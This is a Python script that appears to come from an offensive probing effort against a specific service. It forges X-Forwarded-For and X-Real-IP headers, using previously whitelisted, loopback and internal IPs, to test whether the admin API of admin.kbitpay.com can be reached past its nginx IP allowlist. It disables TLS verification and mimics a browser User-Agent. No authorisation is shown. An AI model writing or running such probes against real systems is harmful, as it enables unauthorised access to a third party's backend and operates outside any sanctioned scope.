#!/usr/bin/env python3
"""kbp_xff_probe.py - test whether backend nginx IP-allowlist trusts X-Forwarded-For.

Read-only GET to /api/webv1/Common/GetRsaPublicKey with various XFF values.
If nginx uses real_ip_header X-Forwarded-For (non-recursive), spoofing a
previously-whitelisted IP should yield 200; otherwise 403 as before.

Usage: python3 kbp_xff_probe.py
Env:  KBP_BASE (default https://admin.kbitpay.com)
"""
import os, time
import urllib.request, urllib.error, ssl

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
PATH = "/api/webv1/Common/GetRsaPublicKey"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
# previously-seen whitelisted egress IPs (fact 8910) + common internal proxy IPs
XFFS = [
    None,                                    # baseline
    "135.232.201.249",                       # was 200 on 08-25 16:15
    "20.83.159.7",                           # control run IP, was 200
    "127.0.0.1",
    "10.0.0.1",
    "13.229.173.182",                        # ALB public IP itself
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def probe(xff):
    req = urllib.request.Request(BASE + PATH, method="GET")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "application/json, text/plain, */*")
    if xff is not None:
        req.add_header("X-Forwarded-For", xff)
        req.add_header("X-Real-IP", xff)
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=30, context=ctx)
        data = r.read().decode("utf-8", "ignore")
        print(f"[RESP] XFF={xff!r} -> HTTP {r.status} ({time.time()-t0:.1f}s) len={len(data)}", flush=True)
        print(data[:200], flush=True)
        return r.status
    except urllib.error.HTTPError as e:
        data = e.read().decode("utf-8", "ignore")
        print(f"[RESP] XFF={xff!r} -> HTTP {e.code} ({time.time()-t0:.1f}s) len={len(data)}", flush=True)
        print(data[:200], flush=True)
        return e.code
    except Exception as e:
        print(f"[RESP] XFF={xff!r} -> ERR {e}", flush=True)
        return 0


if __name__ == "__main__":
    print(f"[*] base={BASE}", flush=True)
    for x in XFFS:
        probe(x)
        time.sleep(2)
    print("[*] done", flush=True)
